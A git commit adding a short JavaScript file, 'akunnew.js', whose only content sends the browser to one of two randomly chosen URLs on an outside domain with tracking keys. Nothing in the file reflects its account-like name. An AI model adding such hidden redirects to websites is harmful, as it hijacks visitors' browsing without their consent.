f345bb138b3f469f7a552df658f2f0ab418f739d
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-11-13 12:15:59 +0800

    Create akunnew.js

---
+++ akunnew.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'//www.effectivegatetocontent.com/bcf9j7den?key=6f0346ec565f3485f607d1f027ca2032',
+'//www.effectivegatetocontent.com/hh9m6iq8u?key=b1b4a076f4bf1c1aa140cc71754f0d67'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
